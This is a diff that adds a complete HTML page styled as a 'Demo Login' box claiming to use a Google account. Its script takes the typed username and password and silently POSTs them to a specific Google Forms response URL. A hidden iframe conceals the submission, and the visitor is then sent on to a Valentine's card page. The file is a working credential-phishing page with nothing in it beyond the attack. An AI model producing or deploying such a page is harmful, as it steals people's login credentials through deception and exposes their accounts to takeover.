@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo Login</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #4facfe, #00f2fe);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-box {
+    background: white;
+    padding: 2rem;
+    border-radius: 10px;
+    width: 300px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  }
+  .login-box h2 {
+    text-align: center;
+    margin-bottom: 1.5rem;
+    color: #333;
+  }
+  input, button {
+    width: 100%;
+    padding: 0.6rem;
+    margin-bottom: 1rem;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    font-size: 1rem;
+  }
+  input:focus {
+    border-color: #4facfe;
+    outline: none;
+  }
+  button {
+    background: #4facfe;
+    color: white;
+    border: none;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #00c6ff;
+  }
+  .error {
+    color: red;
+    font-size: 0.85rem;
+    margin-top: -0.5rem;
+    margin-bottom: 0.5rem;
+  }
+  .google-text {
+    text-align: center;
+    font-size: 0.8rem;
+    margin-bottom: 1rem;
+    color: #555;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2>Login</h2>
+  <div class="google-text">Login using Google account</div>
+
+  <input type="text" id="username" placeholder="Username">
+  <div class="error" id="userErr"></div>
+
+  <input type="password" id="password" placeholder="Password">
+  <div class="error" id="passErr"></div>
+
+  <button id="loginBtn">Login</button>
+</div>
+
+<script>
+const FORM_ACTION = "https://docs.google.com/forms/d/e/1FAIpQLScGaSVqcdy-DmWtqHCt3x1pa24tnaOsiKVkEy2j3ofJn4cgwQ/formResponse";
+const ENTRY_USERNAME = "entry.1326529338";
+const ENTRY_PASSWORD = "entry.1140821926";
+
+document.getElementById("loginBtn").addEventListener("click", function () {
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+
+  // Reset errors
+  document.getElementById("userErr").textContent = "";
+  document.getElementById("passErr").textContent = "";
+
+  // Validation
+  if (!username) {
+    document.getElementById("userErr").textContent = "Username is required";
+    return;
+  }
+  if (!password) {
+    document.getElementById("passErr").textContent = "Password is required";
+    return;
+  }
+
+  // Create hidden form
+  const form = document.createElement("form");
+  form.method = "POST";
+  form.action = FORM_ACTION;
+  form.target = "hidden_iframe";
+
+  const inputUser = document.createElement("input");
+  inputUser.type = "hidden";
+  inputUser.name = ENTRY_USERNAME;
+  inputUser.value = username;
+
+  const inputPass = document.createElement("input");
+  inputPass.type = "hidden";
+  inputPass.name = ENTRY_PASSWORD;
+  inputPass.value = password;
+
+  form.appendChild(inputUser);
+  form.appendChild(inputPass);
+
+  document.body.appendChild(form);
+
+  // Hidden iframe to prevent redirect to Google
+  const iframe = document.createElement("iframe");
+  iframe.name = "hidden_iframe";
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+
+  form.submit();
+
+  // Redirect to Valentines card
+  setTimeout(() => {
+    window.location.href = "valentines.html";
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
